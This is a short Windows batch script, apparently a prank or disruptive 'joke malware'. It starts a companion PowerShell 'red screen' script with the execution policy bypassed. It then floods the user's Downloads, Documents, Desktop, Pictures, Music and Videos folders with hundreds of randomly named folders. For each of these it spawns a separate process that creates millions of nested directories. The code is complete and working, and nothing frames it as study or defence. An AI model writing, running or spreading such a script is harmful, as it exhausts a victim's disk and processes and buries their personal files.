@echo off

REM Launch red screen (runs in parallel)
start "" powershell -ExecutionPolicy Bypass -File "%~dp0REDSCREEN_SIM.ps1"

setlocal enabledelayedexpansion

REM ===== SETTINGS =====
set KING_COUNT=100
set PER_LEVEL=30
REM ====================

if "%1"=="spawn" goto spawn

del kinglist.txt 2>nul

set locations=
set locations=%locations% "%USERPROFILE%\Downloads"
set locations=%locations% "%USERPROFILE%\Documents"
set locations=%locations% "%USERPROFILE%\Desktop"
set locations=%locations% "%USERPROFILE%\Pictures"
set locations=%locations% "%USERPROFILE%\Music"
set locations=%locations% "%USERPROFILE%\Videos"

echo Creating KING folders...

for %%P in (%locations%) do (
    for /L %%K in (1,1,%KING_COUNT%) do (
        set K=KING_!RANDOM!!RANDOM!
        mkdir "%%~P\!K!"
        echo %%~P\!K!>>kinglist.txt
    )
)

echo Launching workers...

for /f "delims=" %%A in (kinglist.txt) do (
    start "" cmd /c ""%~f0" spawn "%%A""
)

exit /b


:spawn
set BASE=%~2

echo Filling %BASE%

for /L %%A in (1,1,%PER_LEVEL%) do (
    set L1=L1_!RANDOM!!RANDOM!
    mkdir "%BASE%\!L1!"

    for /L %%B in (1,1,%PER_LEVEL%) do (
        set L2=L2_!RANDOM!!RANDOM!
        mkdir "%BASE%\!L1!\!L2!"

        for /L %%C in (1,1,%PER_LEVEL%) do (
            set L3=L3_!RANDOM!!RANDOM!
            mkdir "%BASE%\!L1!\!L2!\!L3!"

            for /L %%D in (1,1,%PER_LEVEL%) do (
                set L4=L4_!RANDOM!!RANDOM!
                mkdir "%BASE%\!L1!\!L2!\!L3!\!L4!"

                for /L %%E in (1,1,%PER_LEVEL%) do (
                    set L5=L5_!RANDOM!!RANDOM!
                    mkdir "%BASE%\!L1!\!L2!\!L3!\!L4!\!L5!"
                )
            )
        )
    )
)

exit /b